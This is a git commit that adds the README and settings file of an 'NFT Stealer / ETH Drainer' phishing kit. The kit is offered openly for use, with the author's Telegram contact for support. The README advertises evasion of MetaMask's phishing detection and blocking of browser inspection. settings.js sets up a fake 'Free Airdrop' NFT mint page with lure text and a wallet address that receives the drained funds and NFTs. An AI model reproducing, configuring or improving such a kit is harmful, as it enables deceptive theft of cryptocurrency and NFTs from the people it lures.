514dc33426e3927d57bedc1e7e8b95fafe77807b
Kasie <91336367+cyberlawd@users.noreply.github.com>
2022-10-01 03:00:27 +0100

    Add files via upload

---
+++ README.md
@@ -0,0 +1,28 @@
+### If you have questions or need any help, Message me here: [@cyber_lawd](https://t.me/cyber_lawd) 
+
+## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
+
+![preview](https://imgur.com/a/DwhdTRQ?width=1261&height=610)
+[Drainer V2 BETA VERSION](https://t.me/cyber_lawd)
+
+
+## `✏️ Guidelines on Setting Up the Template:` 
+you need to edit the **settings.js** file. 
+- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
+
+To get instant support, contact me on [@cyber_lawd](https://t.me/cyber_lawd)
+
+
+## `💡 Features`
+
+- [x] simple design 
+- [x] Immediate transactions
+- [x] Contract not required
+- [x] Metamask Anti Phishing Detections
+- [x] Anti F12 Inspect
+- [x] Inspect Element Detection
+- [x] Custom-made Design
+
+
+##### Please ⭐ the repo to support my project
+![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
---
+++ settings.js
@@ -0,0 +1,47 @@
+const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+  collectionInfo = {
+    name: 'THE NFT WORLD',
+    socialMedia: {
+      discord: 'https://discord.gg',
+      twitter: 'https://twitter.com',
+      instagram: 'https://instagram.com/',
+    },
+  },
+
+  indexPageInfo = {
+    backgroundImage: 'background.jpg',
+    title: '{name}',
+    underTitle: 'Free Airdrop',
+  },
+
+  claimPageInfo = {
+    title: 'GET YOUR<br>NFT NOW',
+    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
+    longDescription:
+      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
+    claimButtonText: 'CLAIM NOW',
+    image: 'bg3.png',
+    imageRadius: 250,
+  },
+
+  drainNftsInfo = {
+    active: true,
+    minValue: 0.1,
+    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+  },
+
+  customStrings = {
+    title: 'MINT {name}',
+    connectButton: 'Connect wallet',
+    transferButton: 'Mint now',
+    dateString: 'Pre sale available {date}',
+  }
+  
+if (
+  !receiveAddress.startsWith('0x') ||
+  receiveAddress.length >= 64 || receiveAddress.length <= 40
+) {
+  console.error(
+    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
+  )
+}
